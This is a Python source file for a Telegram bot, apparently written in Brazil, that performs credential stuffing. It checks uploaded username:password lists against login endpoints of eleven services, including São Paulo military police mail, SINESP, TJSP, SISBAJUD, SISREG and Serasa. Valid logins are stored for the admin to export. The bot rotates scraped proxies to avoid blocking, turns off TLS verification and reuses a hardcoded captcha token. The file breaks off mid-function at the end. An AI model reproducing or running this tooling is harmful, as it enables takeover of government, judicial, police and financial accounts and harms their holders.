#!/usr/bin/env python3
"""
Telegram Multi-Checker Bot · by slownx
telebot (pyTelegramBotAPI) · AsyncTeleBot
"""

import asyncio
import base64
import gzip as gzip_mod
import hashlib
import json
import logging
import os
import random
import sqlite3
import ssl
import time
from pathlib import Path

import requests
import urllib3
from bs4 import BeautifulSoup
from dotenv import load_dotenv
from requests.adapters import HTTPAdapter
from telebot import types
from telebot.async_telebot import AsyncTeleBot
from urllib3.util.ssl_ import create_urllib3_context

load_dotenv()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.WARNING)

class _LegacyTLSAdapter(HTTPAdapter):
    """Alguns servidores (ex.: Serasa) recusam o handshake TLS padrão do
    OpenSSL 3.x (SECLEVEL=2). Baixar pra SECLEVEL=1 resolve o
    SSLV3_ALERT_HANDSHAKE_FAILURE; check_hostname/verify_mode são
    desligados aqui para evitar conflito ao usar verify=False."""

    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().proxy_manager_for(*args, **kwargs)

# ── Config ──────────────────────────────────────────────────────────────────────
TOKEN    = os.environ["BOT_TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])
DB_PATH  = "bot.db"
TMP_DIR  = Path("tmp")
TMP_DIR.mkdir(exist_ok=True)

CHECKERS = {
    "checkok":       "CheckOK",
    "consultcenter": "ConsultCenter",
    "credicorp":     "Credicorp",
    "correiopmsp":   "Correio PMSP",
    "sisreg":        "SISREG III",
    "tjsp":          "TJSP",
    "sspds":         "SSPDS CE",
    "checkonn":      "CheckONN",
    "sinesp":        "SINESP",
    "serasa":        "Serasa Empresas",
    "sisbjud":       "SISBAJUD",
}

# ── Database ────────────────────────────────────────────────────────────────────
def db_init():
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id   INTEGER PRIMARY KEY,
                username  TEXT    DEFAULT '',
                full_name TEXT    DEFAULT '',
                is_auth   INTEGER DEFAULT 0,
                added_at  TEXT    DEFAULT (datetime('now')),
                threads   INTEGER DEFAULT 1
            );
            CREATE TABLE IF NOT EXISTS permissions (
                user_id INTEGER,
                checker TEXT,
                enabled INTEGER DEFAULT 0,
                PRIMARY KEY (user_id, checker)
            );
            CREATE TABLE IF NOT EXISTS user_proxies (
                user_id INTEGER PRIMARY KEY,
                proxies TEXT    DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS cx2_lives (
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER,
                username TEXT    DEFAULT '',
                checker  TEXT,
                entry    TEXT,
                saved_at TEXT    DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS settings (
                key   TEXT PRIMARY KEY,
                value TEXT
            );
            CREATE TABLE IF NOT EXISTS public_checkers (
                checker TEXT PRIMARY KEY,
                enabled INTEGER DEFAULT 0
            );
        """)
        # Safe migration for existing DBs without threads column
        cols = [r[1] for r in c.execute("PRAGMA table_info(users)").fetchall()]
        if "threads" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN threads INTEGER DEFAULT 1")

def _db(q, *args, fetch=None):
    with sqlite3.connect(DB_PATH) as c:
        cur = c.execute(q, args)
        if fetch == "one": return cur.fetchone()
        if fetch == "all": return cur.fetchall()

def is_admin(uid): return uid == ADMIN_ID

def ensure_user(uid, username, full_name):
    _db("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?,?,?)",
        uid, username or "", full_name or "")
    _db("UPDATE users SET username=?, full_name=? WHERE user_id=?",
        username or "", full_name or "", uid)

def get_setting(key, default=None):
    r = _db("SELECT value FROM settings WHERE key=?", key, fetch="one")
    return r[0] if r else default

def set_setting(key, value):
    _db("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", key, str(value))

def is_public_mode():
    return get_setting("public_mode", "0") == "1"

def set_public_mode(val: bool):
    set_setting("public_mode", "1" if val else "0")

def get_public_checkers():
    rows = _db("SELECT checker FROM public_checkers WHERE enabled=1", fetch="all") or []
    return [r[0] for r in rows]

def toggle_public_checker(checker):
    cur = _db("SELECT enabled FROM public_checkers WHERE checker=?", checker, fetch="one")
    if cur is None:
        _db("INSERT INTO public_checkers (checker, enabled) VALUES (?,1)", checker)
        return True
    new = 0 if cur[0] else 1
    _db("UPDATE public_checkers SET enabled=? WHERE checker=?", new, checker)
    return bool(new)

def get_public_threads():
    return int(get_setting("public_threads", "1"))

def set_public_threads(n: int):
    set_setting("public_threads", n)

def is_auth(uid):
    if is_admin(uid): return True
    if is_public_mode(): return True
    r = _db("SELECT is_auth FROM users WHERE user_id=?", uid, fetch="one")
    return bool(r and r[0])

def is_individually_authed(uid):
    r = _db("SELECT is_auth FROM users WHERE user_id=?", uid, fetch="one")
    return bool(r and r[0])

def authorize_user(uid, val: bool):
    _db("INSERT OR IGNORE INTO users (user_id) VALUES (?)", uid)
    _db("UPDATE users SET is_auth=? WHERE user_id=?", 1 if val else 0, uid)

def get_user_checkers(uid):
    if is_admin(uid): return list(CHECKERS.keys())
    if is_individually_authed(uid):
        rows = _db("SELECT checker FROM permissions WHERE user_id=? AND enabled=1", uid, fetch="all")
        return [r[0] for r in rows] if rows else []
    if is_public_mode():
        return get_public_checkers()
    return []

def toggle_checker(uid, checker):
    cur = _db("SELECT enabled FROM permissions WHERE user_id=? AND checker=?", uid, checker, fetch="one")
    if cur is None:
        _db("INSERT INTO permissions (user_id, checker, enabled) VALUES (?,?,1)", uid, checker)
        return True
    new = 0 if cur[0] else 1
    _db("UPDATE permissions SET enabled=? WHERE user_id=? AND checker=?", new, uid, checker)
    return bool(new)

def list_users():
    return _db("SELECT user_id, username, full_name, is_auth FROM users ORDER BY added_at DESC", fetch="all") or []

def cx2_save(uid, username, checker_name, entry):
    _db("INSERT INTO cx2_lives (user_id, username, checker, entry) VALUES (?,?,?,?)",
        uid, username or str(uid), checker_name, entry)

def cx2_count():
    r = _db("SELECT COUNT(*) FROM cx2_lives", fetch="one")
    return r[0] if r else 0

def cx2_all():
    rows = _db("SELECT checker, username, entry, saved_at FROM cx2_lives ORDER BY saved_at DESC", fetch="all") or []
    return rows

def cx2_clear():
    _db("DELETE FROM cx2_lives")

def get_user_proxies(uid):
    r = _db("SELECT proxies FROM user_proxies WHERE user_id=?", uid, fetch="one")
    if not r or not r[0]: return []
    return [l.strip() for l in r[0].splitlines() if l.strip()]

def set_user_proxies(uid, text: str):
    _db("INSERT OR REPLACE INTO user_proxies (user_id, proxies) VALUES (?,?)", uid, text)

def get_user_threads(uid):
    if is_admin(uid): return 5
    if is_individually_authed(uid):
        r = _db("SELECT threads FROM users WHERE user_id=?", uid, fetch="one")
        return r[0] if r and r[0] else 1
    if is_public_mode():
        return get_public_threads()
    return 1

def set_user_threads(uid, n: int):
    _db("UPDATE users SET threads=? WHERE user_id=?", n, uid)

# ── Proxy helpers ───────────────────────────────────────────────────────────────
def _proxy_for(uid):
    lst = get_user_proxies(uid)
    if not lst: return None
    p = random.choice(lst)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ── Checker functions ───────────────────────────────────────────────────────────
# Each returns ("live"|"die"|"erro", extra_str)

def _chk_checkok(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://bff.checkok.com.br/auth/rok",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            },
            data=f'{{"username":"{user}","password":"{pwd}"}}',
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        return ("live", "") if "negado" not in r.text else ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_consultcenter(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://sistema.consultcenter.com.br/users/login",
            headers={
                "accept": "text/html,application/xhtml+xml,*/*",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://sistema.consultcenter.com.br",
                "referer": "https://sistema.consultcenter.com.br/users/login",
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
            },
            data=(
                "_method=POST"
                "&data%5B_Token%5D%5Bkey%5D=6433384afa2746bb58b2a03ca3e1311f4b80152b5a4105271287fd9ef9cc3c8cf954286b233895a7aeea65b78162811ea2d6ade92e08fa08b5e44a68db0718cd"
                f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
                f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
            ),
            proxies=px_fn(), timeout=15,
        )
        html = r.text.lower()
        if "senha incorretos" not in html and "bloqueado" not in html:
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_credicorp(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://credicorp-backend.confirmeonline.com.br/credicorp/api/user/authenticate",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0",
            },
            json={"login": user, "password": pwd, "productId": "84"},
            proxies=px_fn(), timeout=30,
        )
        details = r.json().get("details", [])
        if details and details[0].get("action", {}).get("temporaryToken"):
            return ("live", "token")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_correiopmsp(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://correio.policiamilitar.sp.gov.br/names.nsf?Login",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
            },
            data=(
                f"%25%25ModDate=0000000000000004&Username={user}&Password={pwd}"
                "&RedirectTo=%2F&Query_String_Decoded=Login&RedirectTo=%2F"
                "&ReasonText=&%24PublicAccess=1&reasonType=0"
            ),
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        if "Senha" not in r.text and "bloqueada" not in r.text:
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_sisreg(user, pwd, px_fn):
    try:
        h = hashlib.sha256(pwd.encode()).hexdigest()
        r = requests.post(
            "https://sisregiii.saude.gov.br/",
            headers={
                "accept": "text/html,application/xhtml+xml,*/*",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            },
            data={"usuario": user, "senha": "", "senha_256": h, "etapa": "ACESSO", "logout": ""},
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        div = BeautifulSoup(r.text, "html.parser").find("div", {"id": "mensagem"})
        msg = div.get_text(strip=True) if div else ""
        if "incorreto" in msg or "desativado" in msg:
            return ("die", "")
        return ("live", msg or f"status {r.status_code}")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_tjsp(user, pwd, px_fn):
    try:
        PARAMS = {"ReturnUrl": (
            "/rhf/acesso/wsfederation?wtrealm=https%3a%2f%2fwww.tjsp.jus.br%2fRHF%2fPortalServidor%2f"
            "&wctx=WsFedOwinState%3dZ3yVUTwekdJqiwXg49Psp9Uwsbk_KiM9ulcMcto47n8&wa=wsignin1.0"
        )}
        HG = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/149.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*",
        }
        HP = {
            **HG,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.tjsp.jus.br",
            "Referer": "https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
        }
        s  = requests.Session()
        px = px_fn()
        pg = s.get("https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
                   params=PARAMS, headers=HG, proxies=px, timeout=30)
        inp = BeautifulSoup(pg.text, "html.parser").find("input", {"name": "__RequestVerificationToken"})
        if not inp:
            return ("erro", "sem CSRF")
        resp = s.post(
            "https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
            params=PARAMS, headers=HP,
            data={"__RequestVerificationToken": inp["value"],
                  "Usuario": user, "Senha": pwd, "Lembrar": "false"},
            proxies=px, timeout=30, allow_redirects=False,
        )
        if resp.status_code == 302 and "wsfederation" in resp.headers.get("Location", ""):
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_sspds(user, pwd, px_fn):
    try:
        H = {
            "accept": "text/html,application/xhtml+xml,*/*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://consulta.sspds.ce.gov.br",
            "referer": "https://consulta.sspds.ce.gov.br/consulta/index.do",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36",
        }
        s  = requests.Session()
        px = px_fn()
        s.get("https://consulta.sspds.ce.gov.br/consulta/index.do",
              headers=H, proxies=px, timeout=15, verify=False)
        r = s.post(
            "https://consulta.sspds.ce.gov.br/consulta/logon.do",
            headers=H,
            data={"username": user, "password": pwd, "appNameBrowser": "Netscape", "submit": " OK "},
            proxies=px, timeout=15, verify=False,
        )
        if any(k in r.text for k in ("logoff.do", "editSenha.do", "consultaNomeForm")):
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

_SINESP_DISP = "2412DPC0AG"
_SINESP_INST = "ed5f8007-7d67-409f-afce-2e8fc7e7e059"

def _chk_sinesp(user, pwd, px_fn):
    try:
        digits  = "".join(filter(str.isdigit, user))
        usuario = digits if len(digits) == 11 else user
        body = json.dumps({
            "aplicativo": "APP_AGENTE_CAMPO",
            "dispositivo": _SINESP_DISP,
            "instalacao":  _SINESP_INST,
            "senha":       pwd,
            "usuario":     usuario,
        }, separators=(",", ":")).encode("utf-8")
        http = urllib3.HTTPSConnectionPool(
            "seguranca.sinesp.gov.br", port=443,
            cert_reqs="CERT_NONE", assert_hostname=False,
            timeout=urllib3.Timeout(connect=15, read=30),
        )
        resp = http.urlopen(
            "POST",
            "/sinesp-seguranca/api/sessao_autenticada/mobile",
            body=body,
            headers={
                "host":            "seguranca.sinesp.gov.br",
                "content-type":    "application/json; charset=UTF-8",
                "content-length":  str(len(body)),
                "accept-encoding": "gzip",
                "user-agent":      "okhttp/3.14.9",
            },
            preload_content=True,
        )
        raw = resp.data
        if resp.headers.get("content-encoding") == "gzip":
            raw = gzip_mod.decompress(raw)
        text = raw.decode("utf-8", errors="replace")
        if "MOB411" in text:
            return ("die", "")
        data  = json.loads(text)
        token = data.get("token")
        if resp.status == 200 and token and token != "null":
            return ("live", f"token:{str(token)[:20]}...")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

_CHECKONN_CAP = (
    "0cAFcWeA6-VItkOKwH4qO_GB7Tf2ftDzZmkLq9WNjes3aFQ_Z1zsy582pFybIczVJxtnQTBUYhw6_ASRtuCat2cR9snyQMXQKjwFEQuh"
    "MtxaeoUuZvrjLixEGqY0P6SA6tc_3lmJimjf7qLRq9CLB2pnKFwYkFQtspKxH-1u6b07bfGSknadx8nTYWwq4GukxCkQ_pLMZpHSMECs"
    "9WWbz2bLiu0H_8CE1W7JqEU7efXyD7Dluca4J15UKjRF6idEXHntWdRR27CGxSKBcg42LG_d4PQ53a7IiqnGX4fiUQ7sZzIocvB2AO4xD"
    "4TedEVU5fqkmkjWwnsP6wH9nlKoOUN9tPzFvaTfU4rj1hTzMoDTWcjACynuK64qNDzYOBvcXHISvQILPdncxM8nuc-BdjDWL2-3u87v2p"
    "p4eHoWcqqM4m3zVw1HBb5T7G-ZzhTh7QCKW-WbfTMxfCB2HBIxN-eKD8OeYek2fLzEnAPekhT3ZB26ct3enKBG83sQpa1lM1827665O3"
    "uBnvcnN1SR8jy5ZFHBbiy1bq0-HUWUgyyGvhUXi7CfK7wd-nvhshyXfy_FB1JbdAvbMsi4KcdMQaIP1C9b_hOyypMheCGclhOS6j7stRv"
    "gWp1wPpGB_6HAv75YkWwdC6BW49xMHosaiyRygpmsBLFSjzjvBAa3cK65oUetEO27PVwkTbAebJljMSloY8GongiEe25af8pXVuR3HT20G"
    "mwWzUGne38QTlYjPPuk7QywxQ7qDkxXFu18dj5MCYYSWo6H-0A0WeUtE2jqesDa0DPP8pWbz00Vwv530h99FpSvXPLrjCKZPpNmLxyWe4"
    "w4ObvCIDI2rP-l9C0sz5pywfE5HzbiPX-B1tNNvIXd_QDB8ahT39QVhtuRDfWyNBIMz3cMNEmstLImunhhi6ozvMQf-OKGhQAIAxeJtmly"
    "x7MQwCIIEjKNDWSFIe6EifyqAnRr8ihdA-KMVv8BLZWTBEDBqMVU79LOHhfhXt6WHWRZ63M1HVhTfXZuUTZw1cf3X8scETgH5ES0bMCkK"
    "Fw15sZ5befhDMc67uZJqqZACd07dYrP0Tif0XqtJPFv5LdWxbrmzdJSzeJUT2mYggOi8MjwcZV0emn70HL5oN5ZsPZZYIconImo6TXZkYv"
    "jveKHlhPIx0tSYkxDmg9c9FwZWqzkeOr2876QY7fZKY46wyhpgmPKO68HCudmUmE8iauQwbzQz1s_fCcWKCOEgQ6C3QP7YLKgp1yU4b0R"
    "16OhcdIHUJLH3wyAqxwsin6e5ly0sPt4XANa7VtM2xHkheOlK3ttu5qWPbmcWgPrQuiosmwoYQYMY0CfibTvvQShzFLWk8coZBBcvTEjfi"
    "-_vz6gSwc0r_lgEIrf_21CRs9xACr8E3qj92q2WAR57wtIDNmb8a6h4BLP0_ZF9BgF2coD2ry5KqL_OkVCvfJpTekw0tWB_xIWo_xzM01K"
    "iNOgYJ2bYZxiMdTXtSuwP2eKvYqlEfNC01lpXi22yT-uAzoQx-UVuC9ir0rY45jnJiW4RrJ2MMG_yATZO3mmEVp5c2uiX2ys7OVx39mAnC"
    "UTDBdyPRIl_GnNFCPYjlUlJt6r5hTT4mR7YkfXt_BygxGtir0CZXpTGQyxoqaCyh01XjDrAJ298Ca9mqa57o7dhgCbSpYen4A8wjXBT7fF"
    "C8YOxkBhxY5Sk4gZMSNVb0zk_ZLfiKbS7aHjJQT23kJQEH7R7CLYA3zfnJRe2lf2gnaI02lRzP5asPEMcKwtO0gGkK_yi9NuDP4mNSBrj"
    "yeimmITgjXwKr_Zntct8zbD7UKIaG81dqCcQ61kZCbZKeMPaXkBNKgV2J5V_RLpTABx0kAsHSqQaUPcrr_rD--u-v7BFqsg6rOmR_Ou2X0"
    "Pp_iU-nzFrIKlvKzGAxHAc3QLRf0zUY2Z2dwrMXV21X7G0LG3kPy6p77vtkGr6TXLmbvvpWvJW1ZvIjl1g5rU0PW9xQEwQvni0_oh2U_4Y"
    "sMD9ERFyV_1TiDUXDZH3RzJScs-fNHqrr3sdEQGKbuQDcfXSvt6YshWKdgkqyHfYXotlktshX6J0Sns2GlK2xoJ9Q4tVnW1--tvGtlgcZUG"
    "3bnA4k2gU605YWXz01S1cR66D_1vGOo_mVRrX5FjP8HwoQbJfdCjX43hPDlOmv3_FpStwuZTS1Nb3lpu3K"
)

def _chk_checkonn(user, pwd, px_fn):
    try:
        H = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "pt-BR,pt;q=0.9",
            "origin": "https://app.checkonn.com",
            "referer": "https://app.checkonn.com/intranet/login.php",
            "upgrade-insecure-requests": "1",
        }
        s  = requests.Session()
        px = px_fn()
        s.headers.update(H)
        s.get("https://app.checkonn.com/", proxies=px, timeout=10, verify=False)
        s.get("https://app.checkonn.com/intranet/login.php", proxies=px, timeout=10, verify=False)
        r = s.post(
            "https://app.checkonn.com/intranet/login.php",
            data={"login": user, "senha": pwd, "logar": "true",
                  "g-recaptcha-response": _CHECKONN_CAP, "loginEsqueci": ""},
            proxies=px, timeout=10, verify=False, allow_redirects=True,
        )
        is_die = (
            "Senha inválida." in r.text
            or "tentativas restantes!" in r.text
            or "Login inválido" in r.text
            or "login bloqueado!" in r.text.lower()
        )
        return ("die", "") if is_die else ("live", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_serasa(user, pwd, px_fn):
    try:
        basic = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        s = requests.Session()
        s.mount("https://", _LegacyTLSAdapter())
        r = s.post(
            "https://sitenet.serasa.com.br/security/iam/v1/user-identities/login?clientId=5ecebf45aae366236fd0b584",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "pt-BR,pt;q=0.9",
                "Authorization": f"Basic {basic}",
                "Content-Type": "application/json",
                "Origin": "https://empresas.serasaexperian.com.br",
                "Referer": "https://empresas.serasaexperian.com.br/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            },
            json={"deviceId": "6a4442efb2b2e725cb1a4551", "deviceVersion": "V2"},
            proxies=px_fn(), timeout=15, verify=False,
        )
        try:
            token = r.json().get("accessToken")
        except Exception:
            token = None
        if token and token != "null":
            return ("live", f"token:{str(token)[:20]}...")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

_SISBJUD_URL_LOGIN = (
    "https://sso.cloud.pje.jus.br/auth/realms/pje/protocol/openid-connect/auth"
    "?client_id=sisbajud&redirect_uri=https://sisbajud.cnj.jus.br/&response_type=code"
)

def _chk_sisbjud(user, pwd, px_fn):
    try:
        s  = requests.Session()
        px = px_fn()
        r = s.get(_SISBJUD_URL_LOGIN, proxies=px, timeout=15)
        form = BeautifulSoup(r.text, "html.parser").find("form", {"id": "kc-form-login"})
        if not form:
            return ("erro", "sem form de login")
        action = form.get("action")
        r2 = s.post(
            action,
            data={"username": user, "password": pwd, "login": "Entrar"},
            proxies=px, timeout=15,
        )
        html = r2.text
        if "Usuário ou senha inválido" in html:
            return ("die", "")
        if "kc-form-login" in html:
            return ("die", "")
        return ("live", "")
    except Exception as e:
        return ("erro", str(e)[:60])

CHECKER_FN = {
    "checkok":       _chk_checkok,
    "consultcenter": _chk_consultcenter,
    "credicorp":     _chk_credicorp,
    "correiopmsp":   _chk_correiopmsp,
    "sisreg":        _chk_sisreg,
    "tjsp":          _chk_tjsp,
    "sspds":         _chk_sspds,
    "checkonn":      _chk_checkonn,
    "sinesp":        _chk_sinesp,
    "serasa":        _chk_serasa,
    "sisbjud":       _chk_sisbjud,
}

# ── Proxy generator (admin only) ────────────────────────────────────────────────
_FONTES_TXT = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=BR&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=http&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=https&country=BR",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]
_FONTES_JSON = [
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=2&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
]

def _fetch_proxies():
    found = set()
    for url in _FONTES_TXT:
        try:
            r = requests.get(url, timeout=15)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if ":" in line and line.count(".") == 3:
                    found.add(line)
        except Exception:
            pass
    for url in _FONTES_JSON:
        try:
            r = requests.get(url, timeout=15)
            for item in r.json().get("data", []):
                ip, port = item.get("ip", ""), item.get("port", "")
                if ip and port:
                    found.add(f"{ip}:{port}")
        except Exception:
            pass
    return list(found)

def _check_proxy_alive(proxy):
    try:
        r = requests.get(
            "https://api.ipify.org",
            proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
            timeout=8,
        )
        return r.status_code == 200
    except Exception:
        return False

# ── Session state (in-memory, per-user) ─────────────────────────────────────────
_user_data: dict[int, dict] = {}

def _ud(uid):
    return _user_data.setdefault(uid, {})

def _ud_clear(uid):
    _user_data.pop(uid, None)

# ── Bot init ────────────────────────────────────────────────────────────────────
bot = AsyncTeleBot(TOKEN)

# ── Keyboards ───────────────────────────────────────────────────────────────────
def _kb_checkers(uid):
    chks = get_user_checkers(uid)
    if not chks:
        return None
    rows = []
    for i in range(0, len(chks), 2):
        row = [types.InlineKeyboardButton(CHECKERS[chks[i]], callback_data=f"chk:{chks[i]}")]
        if i + 1 < len(chks):
            row.append(types.InlineKeyboardButton(CHECKERS[chks[i + 1]], callback_data=f"chk:{chks[i + 1]}"))
        rows.append(row)
    rows.append([types.InlineKeyboardButton("❌ Cancelar", callback_data="chk:cancel")])
    return types.InlineKeyboardMarkup(rows)

def _kb_delim():
    return types.InlineKeyboardMarkup([
        [
            types.InlineKeyboardButton("  :  ", callback_data="dl::"),
            types.InlineKeyboardButton("  ;  ", callback_data="dl:;"),
            types.InlineKeyboardButton("  |  ", callback_data="dl:|"),
        ],
        [types.InlineKeyboardButton("❌ Cancelar", callback_data="dl:cancel")],
    ])

def _kb_admin():
    return types.InlineKeyboardMarkup([
        [
            types.InlineKeyboardButton("👥 Usuários",      callback_data="adm:users"),
            types.InlineKeyboardButton("🌐 Gerar Proxies", callback_data="adm:proxygen"),
        ],
        [
            types.InlineKeyboardButton("📦 CX2 Lives",     callback_data="adm:cx2"),
            types.InlineKeyboardButton("📊 Status",        callback_data="adm:status"),
        ],
        [types.InlineKeyboardButton("🌍 Modo Público",     callback_data="adm:public")],
    ])

def _kb_public():
    rows = []
    on = is_public_mode()
    rows.append([types.InlineKeyboardButton(
        "🟢 Ativado (todos usam)" if on else "🔴 Desativado (só autorizados)",
        callback_data="pub:toggle",
    )])

    pub_checkers = get_public_checkers()
    btns = [
        types.InlineKeyboardButton(
            f"{'✅' if k in pub_checkers else '➕'}  {name}",
            callback_data=f"pub:chk:{k}",
        )
        for k, name in CHECKERS.items()
    ]
    for i in range(0, len(btns), 2):
        row = [btns[i]]
        if i + 1 < len(btns):
            row.append(btns[i + 1])
        rows.append(row)

    current_threads = get_public_threads()
    thread_opts = [1, 2, 3, 5, 8, 10, 15, 20]
    for i in range(0, len(thread_opts), 4):
        row = []
        for n in thread_opts[i:i + 4]:
            icon = "🔵" if current_threads == n else "⚪"
            row.append(types.InlineKeyboardButton(f"{icon}{n}T", callback_data=f"pub:thd:{n}"))
        rows.append(row)

    rows.append([types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
    return types.InlineKeyboardMarkup(rows)

def _kb_cx2(count):
    return types.InlineKeyboardMarkup([
        [
            types.InlineKeyboardButton(f"📥 Exportar ({count})", callback_data="adm:cx2export"),
            types.InlineKeyboardButton("🔀 Testar lista",        callback_data="adm:cx2test"),
        ],
        [types.InlineKeyboardButton("🗑️ Limpar tudo",           callback_data="adm:cx2clear")],
        [types.InlineKeyboardButton("🔙 Voltar",                callback_data="adm:back")],
    ])

def _kb_users(users):
    rows = []
    for uid, uname, fname, is_a in users:
        label = f"{'✅' if is_a else '❌'}  {fname or uname or uid}"
        rows.append([types.InlineKeyboardButton(label, callback_data=f"usr:{uid}")])
    rows.append([types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
    return types.InlineKeyboardMarkup(rows)

def _kb_manage(target_uid, is_a):
    rows = []

    # Auth toggle
    rows.append([types.InlineKeyboardButton(
        "🔴 Revogar acesso" if is_a else "🟢 Autorizar acesso",
        callback_data=f"auth:{target_uid}:{'0' if is_a else '1'}",
    )])

    # Thread control
    current_threads = get_user_threads(target_uid)
    thread_opts = [1, 2, 3, 5, 8, 10, 15, 20]
    for i in range(0, len(thread_opts), 4):
        row = []
        for n in thread_opts[i:i + 4]:
            icon = "🔵" if current_threads == n else "⚪"
            row.append(types.InlineKeyboardButton(f"{icon}{n}T", callback_data=f"thd:{target_uid}:{n}"))
        rows.append(row)

    # Checker permissions
    perm_rows = _db("SELECT checker, enabled FROM permissions WHERE user_id=?", target_uid, fetch="all") or []
    perm_map  = {r[0]: r[1] for r in perm_rows}
    btns = [
        types.InlineKeyboardButton(
            f"{'✅' if perm_map.get(k, 0) else '➕'}  {name}",
            callback_data=f"perm:{target_uid}:{k}",
        )
        for k, name in CHECKERS.items()
    ]
    for i in range(0, len(btns), 2):
        row = [btns[i]]
        if i + 1 < len(btns):
            row.append(btns[i + 1])
        rows.append(row)

    # Delete user proxies
    px_count = len(get_user_proxies(target_uid))
    rows.append([types.InlineKeyboardButton(
        f"🗑️ Limpar proxies ({px_count})" if px_count else "🗑️ Sem proxies (vazio)",
        callback_data=f"delpx:{target_uid}",
    )])

    rows.append([types.InlineKeyboardButton("🔙 Usuários", callback_data="adm:users")])
    return types.InlineKeyboardMarkup(rows)

# ── Small helpers ────────────────────────────────────────────────────────────────
async def _download_document(document) -> bytes:
    file_info = await bot.get_file(document.file_id)
    return await bot.download_file(file_info.file_path)

async def _edit(chat_id, message_id, text, **kwargs):
    try:
        await bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, **kwargs)
    except Exception:
        pass

# ── Command handlers ────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(message):
